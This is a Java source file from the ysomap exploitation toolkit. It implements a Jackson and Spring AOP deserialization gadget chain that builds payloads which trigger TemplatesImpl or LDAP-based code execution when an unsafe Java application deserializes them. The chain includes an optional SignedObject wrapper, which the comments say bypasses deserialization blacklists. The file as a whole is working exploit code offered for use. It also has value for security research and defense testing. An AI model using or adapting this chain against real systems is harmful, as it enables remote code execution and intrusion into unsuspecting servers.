package ysomap.payloads.java.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;
import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Objects;

import static ysomap.payloads.java.jackson.BadAttributeValueExpExceptionWithJackson.javaassistFlag;

/**
 * @author whocansee
 * @since 2023/10/7
 * 基本原理和BadAttributeValueExpExceptionWithJackson一致，只是将toString触发方式改成了SpringAOP里面的一条链（最先用于Hessian反序列化）
 * 由于Jackson序列化逻辑中getter调用顺序的问题，在调用到getDatabaseMetaData()之前就会报错，因而不支持JdbcRowSetImplBullet
 * Jackson链存在调用顺序不稳定的问题，以TemplatesImplBullet为例，如果在getOutputProperties之前调用到getStylesheetDOM就会报错退出
 * 此链在Spring AOP依赖下进行改进，可稳定触发getOutputProperties，原理详见《从JSON1链中学习处理JACKSON链的不稳定性》
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"LdapAttributeBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"Springframework"})
@Details("基本原理和BadAttributeValueExpExceptionWithJackson一致，只是将toString触发方式改成了SpringAOP里面的一条链（最先用于Hessian反序列化）")
public class SpringAOPXStringWithJackson extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }
    @Require(name = "wrapped", detail = "是否使用SignedObject进行二次反序列化（用以绕过反序列化黑名单）" +
            "默认不使用，填true表示启用")
    private Boolean wrapped = false;

    @Override
    public Object pack(Object obj) throws Exception {
        if (javaassistFlag == 0){
        javaassistFlag = 1;
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
        }
        Object obj1 = getterGadget(obj);
        if (wrapped) {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            kpg.initialize(1024);
            KeyPair kp = kpg.generateKeyPair();
            SignedObject signedObject = new SignedObject((Serializable) obj1, kp.getPrivate(), Signature.getInstance("DSA"));
            return PayloadHelper.makeReadObjectToStringTrigger(getterGadget(signedObject));
        } else {
            return PayloadHelper.makeReadObjectToStringTrigger(obj1);
        }
    }
    public static void setValue(Object obj,String field,Object value) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj,value);
    }
    public static Object getterGadget(Object obj) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        POJONode nodeProxy = new POJONode(proxy);
        POJONode node = new POJONode(obj);

        POJONode node1 = new POJONode(null);
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(node1);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("x"));

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(v1,v1);
        hashMap.put(v2,v2);
        if(obj instanceof TemplatesImpl){
            setValue(v1,"target",nodeProxy);
        }else setValue(v1,"target",node);
        return hashMap;
    }
}